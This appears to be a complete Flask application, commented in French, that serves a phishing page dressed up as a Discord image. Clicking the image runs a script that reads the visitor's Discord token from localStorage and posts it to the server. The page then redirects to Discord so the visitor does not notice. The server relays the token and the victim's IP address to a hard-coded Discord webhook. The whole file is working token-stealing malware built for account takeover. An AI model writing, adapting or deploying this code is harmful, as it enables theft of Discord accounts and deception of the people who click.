from flask import Flask, render_template_string, request
import requests
import time

# --- CONFIGURATION ---
# Remplace par ton Webhook Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1543762448643915799/o9B-rPF0YGlhtO00A48susJVoQEtou5nDakvei0zLorngDfdvh0KotsbULWKBnpVFTYG"

# HTML de la page piégée (Version Silencieuse)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image</title>
    <style>
        body { 
            margin: 0; 
            background: #23272a; /* Couleur sombre Discord */
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            overflow: hidden;
        }
        img { 
            max-width: 90%; 
            max-height: 90%; 
            cursor: pointer; 
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            transition: transform 0.2s;
        }
        img:hover {
            transform: scale(1.02);
        }
        /* Petit indicateur discret que l'image charge */
        .loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #fff;
            font-family: sans-serif;
            font-size: 14px;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="loader">Chargement...</div>
    
    <!-- Image d'exemple : Remplace par une image populaire -->
    <img src="https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96059c&is=6a94b41c&hm=30892b6e1510ac4149823f61df17f232f9215a480c3d362296f5be7140c4eb1f&=&format=webp&quality=lossless&width=1024&height=558g" id="trapImage" style="display:none;">

    <script>
        // Quand l'image est chargée, on l'affiche et on cache le loader
        const img = document.getElementById('trapImage');
        img.onload = function() {
            document.querySelector('.loader').style.display = 'none';
            img.style.display = 'block';
        };
        img.onerror = function() {
             // Si l'image ne charge pas, on redir quand même pour ne pas suspecter
             document.querySelector('.loader').style.display = 'none';
             img.style.display = 'block';
        };

        // Le clic déclenche le vol silencieux
        document.getElementById('trapImage').addEventListener('click', function() {
            // 1. Chercher le token
            let token = null;
            for (let key in localStorage) {
                if (key.startsWith('discord-token-')) {
                    token = localStorage.getItem(key);
                    break;
                }
            }

            // 2. Envoyer le token en arrière-plan (silencieux)
            if (token) {
                fetch('/send-token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token: token })
                }).catch(() => {}); // On ignore les erreurs réseau
            }

            // 3. Redirection immédiate vers Discord pour cacher qu'on a cliqué
            // On utilise window.location.href pour que l'utilisateur pense qu'il a ouvert Discord
            window.location.href = "https://discord.com/app";
        });
    </script>
</body>
</html>
"""

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/send-token', methods=['POST'])
def send_token():
    data = request.json
    token = data.get('token', 'Inconnu')
    ip = request.remote_addr
    
    # On n'envoie pas de notification "bruyante"
    payload = {
        "content": "",
        "embeds": [{
            "title": "Token Capturé",
            "color": 0x2ECC71,  # Vert discret
            "fields": [
                {"name": "Token", "value": f"`{token}`", "inline": False},
                {"name": "IP", "value": ip, "inline": True}
            ]
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=2)
    except:
        pass
    
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
